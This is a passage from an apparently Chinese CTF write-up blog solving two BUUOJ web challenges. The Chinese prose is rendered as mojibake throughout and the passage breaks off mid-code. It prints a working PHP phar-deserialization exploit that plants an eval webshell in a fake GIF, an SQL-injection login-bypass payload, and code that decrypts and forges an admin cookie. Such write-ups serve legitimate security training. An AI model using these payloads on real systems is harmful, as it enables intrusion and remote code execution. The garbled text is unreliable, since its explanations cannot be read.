rel="noopener">https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python</a></p><p>è´´ä¸€ä¸‹å®˜æ–¹wpåœ°å€ï¼š<a href="https://www.anquanke.com/post/id/194640" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194640</a></p><h3 id="0x-06-SWPUCTF-2018-SimplePHP"><a href="#0x-06-SWPUCTF-2018-SimplePHP" class="headerlink" title="0x 06 [SWPUCTF 2018]SimplePHP"></a>0x 06 [SWPUCTF 2018]SimplePHP</h3><ul><li><p>è€ƒç‚¹</p><p>pharååºåˆ—åŒ–</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¡µé¢æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œè¯»å–æ–‡ä»¶å’Œä¸Šä¼ æ–‡ä»¶ï¼Œåˆ©ç”¨è¯»å–æ–‡ä»¶è¯»å–æºä»£ç ï¼Œå¦‚ä¸‹</li></ol><p>file.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  </span><br><span class="line">include &#39;function.php&#39;; </span><br><span class="line">include &#39;class.php&#39;; </span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show &#x3D; new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source &#x3D; $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">    die(&#39;file doesn\&#39;t exists.&#39;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str &#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test &#x3D; $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#39;hacker!&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value &#x3D; $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text &#x3D; base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>popé“¾æ„é€ å¦‚ä¸‹ï¼š</p><blockquote><p>1.åˆ©ç”¨C1e4rç±»çš„<code>__destruct()</code>ä¸­çš„<code>echo $this-&gt;test</code><br> 2.è§¦å‘Showç±»çš„<code>__toString()</code><br> 3.åˆ©ç”¨Showç±»çš„<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br> 4.è§¦å‘Testç±»çš„<code>__get()</code><br> 5.æˆåŠŸåˆ©ç”¨<code>file_get()</code>è¯»æ–‡ä»¶</p></blockquote><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r&#123;</span><br><span class="line">public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">$a-&gt;params[&#39;source&#39;] &#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;</span><br><span class="line"></span><br><span class="line">$b &#x3D; new Show();</span><br><span class="line">$b-&gt;str[&#39;str&#39;]&#x3D;$a;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new C1e4r();</span><br><span class="line">$c-&gt;str &#x3D; $b;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&#39;phar.phar&#39;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php echo 1;eval($_GET[&quot;Smi1e&quot;]);?&gt;&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</span><br><span class="line">$phar -&gt; setMetadata($c); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">$phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);&#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">$phar -&gt; stopBuffering();   &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharä¿®æ”¹åç¼€ä¸ºjpgåä¸Šä¼ ï¼Œè®¡ç®—ä¸Šä¼ åçš„è·¯å¾„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename &#x3D; md5(&quot;phar.jpg&quot;.&quot;174.0.222.75&quot;).&quot;.jpg&quot;;</span><br><span class="line">echo $filename;</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š<code>http://15ad6660-d710-4885-80f1-1341ad6588b6.node3.buuoj.cn/file.php?file=phar:///var/www/html/upload/e961ead23ad245f8859475af4eb77a87.jpg</code>å¾—åˆ°base64ç¼–ç çš„flag</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/3656#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-14</a></p><h3 id="0x-07-SWPU2019-Web6"><a href="#0x-07-SWPU2019-Web6" class="headerlink" title="0x 07 [SWPU2019]Web6"></a>0x 07 [SWPU2019]Web6</h3><ul><li><p>è€ƒç‚¹</p><p>SQLæ³¨å…¥ã€session.upload_progressçš„åˆ©ç”¨</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¦–é¡µæ˜¯ç™»å½•é¡µé¢ï¼Œç»è¿‡æµ‹è¯•å‘ç°è´¦å·å¯†ç åˆ†å¼€éªŒè¯ï¼Œä¸”æ²¡æœ‰éªŒè¯è´¦å·å¯†ç æ˜¯å¦ä¸ä¸ºç©ºï¼ŒçŒœæµ‹åå°ä»£ç é€»è¾‘ä¸º</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from users where username&#x3D;&#39;$name&#39; and passwd&#x3D;&#39;$pass&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;passwd&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;]) &#123;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç»•è¿‡<code>if($key[&#39;passwd&#39;] == $_POST[&#39;passwd&#39;])</code>ï¼Œä½¿ç”¨å¦‚ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼š1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL #</span><br><span class="line">å¯†ç ä¸ºç©º</span><br></pre></td></tr></table></figure><p>è¿™å„¿with rollupä¼šå¢åŠ ä¸€è¡Œï¼Œå…¶ä¸­passwdä¸ºNULLï¼Œhaving passwd is NULL è¡¨ç¤ºé€‰æ‹©æˆ‘ä»¬å¢åŠ çš„é‚£ä¸€è¡Œï¼Œå³æœ‰ç”¨æˆ·åï¼Œå¯†ç ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬ç™»é™†æ—¶å¯†ç ä¸ºç©ºå³å¯ã€‚æœ¬åœ°éªŒè¯å¦‚ä¸‹ï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323195335336.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323200804839.png" alt></p><ol start="2"><li>æ‰«ä¸€ä¸‹ç›®å½•å‘ç°ä¸€ä¸ª<code>wsdl.php</code>,<code>f12</code>å¯ä»¥æŸ¥çœ‹é‡Œé¢çš„å†…å®¹ï¼Œå…¶ä¸­å‡ºç°äº†å¾ˆå¤šçš„å…³äº<code>SoapServer</code>çš„å­—æ®µï¼Œç™¾åº¦ä¸€ä¸‹æ˜¯<em>WSDL</em>æ–‡ä»¶</li></ol><blockquote><p>portTypeå…ƒç´ <br>       PortTypeå…ƒç´ å®šä¹‰äº†WebæœåŠ¡çš„æŠ½è±¡æ¥å£ï¼Œå®ƒå¯ä»¥ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªoperationå…ƒç´ ï¼Œæ¯ä¸ªoperationå…ƒç´ å®šä¹‰äº†ä¸€ä¸ªRPCæ ·å¼æˆ–è€…æ–‡æ¡£æ ·å¼çš„WebæœåŠ¡æ–¹æ³•ã€‚</p><p>operationå…ƒç´ <br>      Operationå…ƒç´ è¦ç”¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªmessagesæ¶ˆæ¯æ¥å®šä¹‰å®ƒçš„è¾“å…¥ã€è¾“å‡ºä»¥åŠé”™è¯¯ã€‚</p></blockquote><p>å°è¯•è°ƒç”¨Get_flag,é¡µé¢å›æ˜¾ä¸å…è®¸çš„æ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°å­˜åœ¨File_readæ–¹æ³•ï¼Œå‘ç°éœ€è¦postä¸€ä¸ªfilenameæ¥è¿›è¡Œæ–‡ä»¶è¯»å–</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326125825216.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326130048324.png" alt></p><p>å°è¯•æ ¹æ®hintæ–¹æ³•å›æ˜¾è¿›è¡Œæ–‡ä»¶è¯»å–index.phpæºä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">include (&quot;encode.php&quot;);</span><br><span class="line">include(&quot;Service.php&quot;);</span><br><span class="line">&#x2F;&#x2F;error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;phpinfo();</span><br><span class="line">$method &#x3D; $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F;echo 1231;</span><br><span class="line">$allow_method &#x3D; array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);</span><br><span class="line">if(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;not allow method&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($method&#x3D;&#x3D;&#x3D;&quot;File_read&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $param &#x3D;$_POST[&#39;filename&#39;];</span><br><span class="line">    $param2&#x3D;null;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">    if($method&#x3D;&#x3D;&#x3D;&quot;login&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $param&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">        $param2 &#x3D; $_POST[&#39;passwd&#39;];</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;method can use&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $method;</span><br><span class="line">$newclass &#x3D; new Service();</span><br><span class="line">echo $newclass-&gt;$method($param,$param2);</span><br><span class="line">ob_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æºä»£ç æç¤ºè°ƒç”¨get_flagæ–¹æ³•</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326130718753.png" alt></p><p>å…è®¸admin 127.0.0.1 get_flag çš„è¯çŒœæµ‹æ˜¯è¶ŠæƒåŠ ssrfäº†</p><ol start="3"><li>å…ˆè¿›è¡Œè¶Šæƒï¼ŒæŸ¥çœ‹cookie ç„¶åè¯»æ–‡ä»¶encode.php å’Œkeyaaaaaaaasdfsaf.txtæ–‡ä»¶ï¼Œå¾—åˆ°keyä¸º<code>flag{this_is_false_flag}</code></li></ol><p>encode.phpæºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">    $key    &#x3D;    md5($key);</span><br><span class="line">    $h      &#x3D;    0;</span><br><span class="line">    $length    &#x3D;    strlen($content);</span><br><span class="line">    $swpuctf      &#x3D;    strlen($key);</span><br><span class="line">    $varch   &#x3D;    &#39;&#39;;</span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  &#x3D;  &#39;&#39;;    </span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å‡ºå¯¹åº”çš„è§£å¯†å‡½æ•°,è§£å¯†cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">    $key    &#x3D;    md5($key);</span><br><span class="line">    $h      &#x3D;    0;</span><br><span class="line">    $length    &#x3D;    strlen($content);</span><br><span class="line">    $swpuctf      &#x3D;    strlen($key);</span><br><span class="line">    $varch   &#x3D;    &#39;&#39;;</span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  &#x3D;  &#39;&#39;;    </span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($swpu);</span><br><span class="line">&#125;</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5($key);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $data &#x3D; base64_decode($data);</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $l &#x3D; strlen($key);</span><br><span class="line">    $char &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $l)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; substr($key, $x, 1);</span><br><span class="line">        $x++;</span><br><span class="line">    &#125;</span><br><span class="line">    $str &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1)))</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo decrypt(&quot;3J6Roahxag&#x3D;&#x3D;&quot;,&quot;flag&#123;this_is_false_flag&#125;&quot;);</span><br><span class="line">echo en_crypt(&quot;admin:1&quot;,&quot;flag&#123;this_is_false_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°çš„cookieä¸º<code>xiaoC:2</code>ï¼Œæ ¹æ®æ ¼å¼åŠ å¯†admin:1ï¼Œç„¶åæ›¿æ¢cookie,å˜æˆadminï¼Œè¯»å–se.phpçš„æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($name,$param)</span><br><span class="line">        &#123;</span><br><span class="line">            if($this-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 &#x3D; $this-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($ke)</span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public $mod3;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 &#x3D; $this-&gt;mod3.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd</span><br><span 